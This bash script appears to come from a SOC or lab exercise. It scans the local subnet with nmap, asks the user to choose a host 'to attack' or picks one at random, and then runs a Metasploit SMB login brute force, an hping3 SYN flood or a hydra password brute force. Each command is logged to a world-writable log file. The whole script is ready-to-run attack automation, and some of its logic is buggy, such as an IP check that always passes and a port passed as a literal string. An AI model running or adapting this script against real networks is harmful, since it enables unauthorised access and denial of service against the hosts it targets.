#!/bin/bash

sudo touch /var/log/soc.log
sudo chmod 666 /var/log/soc.log
crunch 4 4 abcd > pass.txt
echo 'Passw0rd!' >> pass.txt
crunch 4 4 abcd > user.txt
echo 'administrator' >> user.txt



current=$(TZ=Asia/Singapore date)

localIP=$(ifconfig | grep broadcast | awk '{print $2}')
echo "Your IP is: '$localIP'"
echo -e "\n"

echo 'Please enter your subnet mask: [a]24 [b]16 [c]8'
read OPTIONS

case $OPTIONS in

	a|24)
		sudo nmap -f -Pn $localIP/24 -oG nmap_list
		echo "${current} sudo nmap -f -Pn '$localIP'/24" >> /var/log/soc.log
	;;
	b|16) 
		sudo nmap -f -Pn $localIP/16 -oG nmap_list
		echo "${current} sudo nmap -f -Pn '$localIP'/16" >> /var/log/soc.log
	;;
	c|8)
		sudo nmap -f -Pn $localIP/8 -oG nmap_list
		echo "${current} sudo nmap -f -Pn '$localIP'/8" >> /var/log/soc.log
	;;	
	*)	echo "Subnet not available. Please restart"
		exit
esac

cat nmap_list | grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}' | sort | uniq > ip_list

echo -e "\n"
AvailIP=$(cat nmap_list | grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}' | sort | uniq)
echo "These are the IP on your network"
echo $AvailIP
echo -e "\n"

var1=$(cat ip_list | head -n 1)
var2=$(cat ip_list | head -n 2 | tail -n 1)
var3=$(cat ip_list | head -n 3 | tail -n 1)
var4=$(cat ip_list | head -n 4 | tail -n 1)
var5=$(cat ip_list | tail -n 1)

echo "Please select an IP address to attack: '$var1' '$var2' '$var3' '$var4' '$var5' or enter [R] for random IP " #Which IP to attack.
read IPsel
if [[ $IPsel == "R" ]]
	then
		rdmIP=$(shuf -n 1 ip_list)
		echo $rdmIP
		targetIP=$rdmIP
elif [[ $IPsel == $var1 || $var2 || $var3 || $var4 || $var5 ]]
	then
		targetIP=$IPsel
		echo $targetIP
	else
		echo "Invalid IP entered. Please restart."
fi

function Smbatk()
{
	echo 'use auxiliary/scanner/smb/smb_login' > smb.rc
	echo "set rhosts '$targetIP'" >> smb.rc
	echo 'set smbdomain mydomain.local' >> smb.rc
	echo 'set pass_file pass.txt' >> smb.rc
	echo 'set user_file user.txt' >> smb.rc
	echo 'run' >> smb.rc
	echo 'exit' >> smb.rc
	msfconsole -qr smb.rc -o smbloginres.txt
	echo "${current} msfconsole -qr smb.rc '$targetIP'" >> /var/log/soc.log
	rm pass.txt
	rm user.txt
}

function Ddosatk()
{
	
	echo "You chose DDOS for $targetIP"
	echo "Please enter intended Port to attack"
	read userinput
	sudo hping3 -S $targetIP -c 200 -d 250 -p '$userinput' > Ddos.txt
	echo "${current} sudo hping3 -S '$targetIP' -c 200 -d 250 -p '$userinput' '$targetIP'" >> /var/log/soc.log
}

function Bruteforce()
{
	AvailPort=$(cat nmap_list | grep $targetIP | grep Ports | sed 's/[\/]/ /g')
	echo $AvailPort
	echo "Please enter type of service to bruteforce [ssh/ftp/rdp]"
	read Selport
	hydra -U user.txt -P pass.txt $targetIP $Selport > bruteforce.txt
	echo "${current} hydra -U user.txt -P pass.txt '$targetIP' '$Selport'" >> /var/log/soc.log
}


echo "Hping3" > attack_list
echo "Smb_attack" >> attack_list
echo "Hydra" >> attack_list
echo -e "\n"

echo "hping3 is a network tool able to send custom ICMP/UDP/TCP packets and to display target replies like ping does with ICMP replies"
echo "Hydra is a brute-forcing tool that helps penetration testers and ethical hackers crack the passwords of network services"
echo "SMB login on a range of machines and report successful logins."

echo -e "\n"
echo "Please select type of attack: [a]Hping3 | [b]Smb_attack | [c]Hydra or enter [R] for random type of attack"
read Atktype

case $Atktype in
	a|Hping3)
		Ddosatk
	;;
	b|Smb_attack)
		Smbatk
	;;
	c|Hydra)
		Bruteforce
	;;
	R)
		Rdmatk=$(shuf -n 1 attack_list)
		if	[[ $Rdmatk == 'Hping3' ]]
			then
				Ddosatk
		elif [[ $Rdmatk == 'SMB_attack' ]]
			then
				Smbatk
		elif [[ $Rdmatk == 'Hydra' ]]
			then
				Bruteforce
		fi
	;;
	*)
		echo "Invalid type of attack entered. Please restart."
		exit
esac
		












